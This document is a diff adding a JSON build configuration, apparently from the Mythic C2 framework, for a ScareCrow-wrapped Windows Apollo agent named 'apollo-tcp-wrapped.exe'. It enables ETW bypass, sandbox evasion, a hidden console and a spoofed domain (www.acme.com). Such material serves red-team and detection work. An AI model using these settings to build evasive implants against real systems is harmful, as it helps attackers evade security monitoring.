@@ -1,0 +1,46 @@
+{
+	"description": "Created by mythic_admin at 2026-09-03 20:29:38 Z",
+	"payload_type": "scarecrow_wrapper",
+	"c2_profiles": [],
+	"build_parameters": [
+		{
+			"name": "loader",
+			"value": "control"
+		},
+		{
+			"name": "execute",
+			"value": "RtlCopy"
+		},
+		{
+			"name": "etw",
+			"value": true
+		},
+		{
+			"name": "console",
+			"value": false
+		},
+		{
+			"name": "sandbox",
+			"value": true
+		},
+		{
+			"name": "unmodified",
+			"value": false
+		},
+		{
+			"name": "injection",
+			"value": ""
+		},
+		{
+			"name": "domain",
+			"value": "www.acme.com"
+		},
+		{
+			"name": "export",
+			"value": ""
+		}
+	],
+	"selected_os": "Windows",
+	"filename": "apollo-tcp-wrapped.exe",
+	"wrapped_payload": "8b53fd8c-7596-4503-85bc-39869c9f4e01"
+}
